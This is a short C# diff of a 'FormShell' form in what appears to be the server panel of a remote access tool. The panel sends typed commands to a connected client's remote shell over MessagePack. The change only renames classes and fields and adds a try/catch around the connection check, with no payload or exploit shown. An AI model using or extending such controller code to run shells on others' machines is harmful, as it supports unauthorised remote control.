@@ -1,5 +1,5 @@
 ﻿using Server.MessagePack;
-using Server.Sockets;
+using Server.Connection;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -17,7 +17,7 @@ namespace Server.Forms
     public partial class FormShell : Form
     {
         public Form1 F { get; set; }
-        internal Clients C { get; set; }
+        internal Clients Client { get; set; }
 
         public FormShell()
         {
@@ -41,7 +41,7 @@ namespace Server.Forms
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "shellWriteInput";
                 msgpack.ForcePathObject("WriteInput").AsString = textBox1.Text;
-                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 textBox1.Clear();
             }
         }
@@ -51,12 +51,16 @@ namespace Server.Forms
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "shellWriteInput";
             msgpack.ForcePathObject("WriteInput").AsString = "exit";
-            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
         }
 
         private void Timer1_Tick(object sender, EventArgs e)
         {
-            if (!C.ClientSocket.Connected) this.Close();
+            try
+            {
+                if (!Client.TcpClient.Connected) this.Close();
+            }
+            catch { this.Close(); }
         }
 
         private void Label1_Click(object sender, EventArgs e)
